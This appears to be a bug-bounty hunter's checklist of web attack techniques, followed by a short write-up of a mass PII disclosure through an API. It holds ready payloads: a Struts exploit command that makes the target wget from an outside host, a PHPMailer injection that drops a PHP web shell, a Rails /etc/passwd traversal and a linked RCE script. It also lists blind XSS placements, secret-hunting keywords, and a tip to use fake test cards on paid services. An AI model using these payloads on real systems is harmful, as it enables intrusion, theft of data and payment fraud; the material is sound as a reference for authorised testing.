***
**Bugs**
- **Blind XSS**
	- Blind XSS Payload in User-Agent header
	- BXSS payload while logging (Enter the BXSS payload in forget pass, login, signup to generate errors)
	- Use BXSS payload as your password
- Add header in the Proxy > Options (`X-Forwarded-Host: site.com`) - browse the program and the later click burp > search and try to find your `X-Forwarded-Host` value for web cache deception
- HTTP Request Smuggling
- Apply on `.xhtml`
- `python struts-pwn.py -u http://site.com/orders.xhtml -c "wget http://ip:1337/test" --exploit`
- Test for Electronic Code Book (`AAAAAAA aaaaaaa BBBBB`)
- CVE-2016-10033: PHPMailer RCE
	- email: "attacker@127.0.0.1\" -oQ/tmp/ -X /var/www/shell.php root"@127.0.0.1
	- subject: <?php system($_GET['c']);?>
- Change all the request to TRACE method to disclose or access info
- `blc http://company.com -ro` (check for broken links)
- `companyname.atlassian.net`
- `jira.companyname.com`
- Vhost testing
- Test for buckets
- Check Github & docker list
- api, token, username, password, secret, dev, prod, jenkins, config, ssh, ftp, MYSQL_PASSWORD, admin, AWS, bucket, GITHUB_TOKEN
- `gau site.com`
- Accessing misconfigured date of and `org: https://stroage.googleapis.com/<org-name>`
- Unauthorized access to org's google groups: `https://groups.google.com/a/<domain-name>`
- `waybackurls site.com`
- if running ruby on rails then: `Accept ../../../../../etc/passwd{{`
	- CVE-2019-5418
	- Fixed in Action View 6.0.0.beta3, 5.2.2.1, 5.1.6.2, 5.0.7.2, 4.2.11.1
- CVE-2013-0156: Rails Object injection: `ruby rails_rce.rb http://site.com` [script](https://gist.githubusercontent.com/postmodern/4499206/raw/a68d6ff8c1f9570a09365036aeb96f6a9fff7121/rails_rce.rb)
- CVE-2019-11043 Hint: PHP based website on NGINX phuip-fpizdam `http://site.com/anyphpfile.php`
- Check for crlf injection
- Bypass open redirection protection
- keyfinder
- `site: scribd.com "target"` (or you can use other dorks like "TARGET")
- Check email verification `admin@site.com`
- `site.com/home/....4....json` (Will disclose all the content of the home dir + sensitive info)
- CVE-2019-19781 Citrix NetScaler Directory Traversal:
```bash
curl -vk -path-as-is https://$TERGET/vpn/../vpns/ 2>&1 | grep "You don't have permission to acces /vpns/" >/dev/null && echo "VULNERABLE: $TERGET" || echo "MITIGATED:$TARGET" 
```

---

Some organizations allow test cards on production environments as they forget to disable testing mode. When you come across such a website that requires `Paid Subscription` and is using `Stripe` as a `Payment Gateway`, always try demo or fake debit cards.

---

## Excessive Date Exposure
In a private bug bounty program, the response to the login request had three addition parameters: `isAdmin`, `isStaff`, and `isSupport`. All three were initially set to `false`. Setting them to `true` grated access to a new endpoint that allowed searching for companies using their registration IDs. 
A GET request to the following endpoint was made when searching for a company:
```http
GET /company/companies.json?registration_number=123456&page=1&per1 HTTP/1.1
Host: api.site.com
```
The `GUI` displayed only the `Company's Name`. However, by using Burp Suited to analyzed the response, `Sensitive Personal Information` for the company was exposed. The disclosed information included the `Company Name`, `Email`, `Phone Number`, and `Full Address (Street, City, Country)`.
This data was initially exclusive to a single company, and any attempt at brute-forcing was disallowed on that endpoint due to the presence of rate-limit protection.
I cleared the values of all parameters and sent the request with empty fields.
```http
GET /company/companies.json?registration_number=&page=&per= HTTP/1.1
```
As a result, the sensitive information of every company in the program was exposed. It was a Mass PII disclosure affecting more than 40 thousand companies.
